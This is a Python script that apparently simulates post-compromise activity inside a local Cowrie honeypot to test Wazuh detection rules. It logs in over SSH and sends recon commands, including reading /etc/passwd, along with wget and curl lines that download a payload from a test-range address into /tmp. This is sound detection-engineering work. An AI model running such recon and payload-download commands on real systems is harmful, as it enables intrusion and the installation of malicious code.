#!/usr/bin/env python3
"""
Simulate post-compromise activity inside the Cowrie honeypot.

Logs in with the credential the brute-force "found" (root/hunter2) and runs a
realistic sequence of recon + payload-download commands so Wazuh fires the
command/discovery/ingress rules (100106, 100107, 100108).

Usage:
    pip install paramiko
    python run_session.py                 # localhost:2222
    python run_session.py 127.0.0.1 2222
"""
import sys
import time

try:
    import paramiko
except ImportError:
    sys.exit("paramiko not installed. Run:  pip install paramiko")

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 2222
USER, PW = "root", "hunter2"

# Maps to: discovery (T1082/T1033) and ingress tool transfer (T1105)
COMMANDS = [
    "whoami",
    "id",
    "uname -a",
    "cat /etc/passwd",
    "ps aux",
    "ifconfig",
    "wget http://203.0.113.10/x.sh -O /tmp/x.sh",   # T1105 (203.0.113.0/24 = TEST-NET, safe)
    "curl http://203.0.113.10/payload -o /tmp/p",
]


def main():
    print(f"[*] Logging in as {USER}@{HOST}:{PORT}")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, port=PORT, username=USER, password=PW,
                   allow_agent=False, look_for_keys=False, timeout=8)

    chan = client.invoke_shell()
    time.sleep(1)
    for cmd in COMMANDS:
        print(f"  $ {cmd}")
        chan.send(cmd + "\n")
        time.sleep(1.2)

    chan.send("exit\n")
    time.sleep(1)
    client.close()
    print("\n[*] Session done. Check Wazuh for command/discovery/ingress alerts.")


if __name__ == "__main__":
    main()
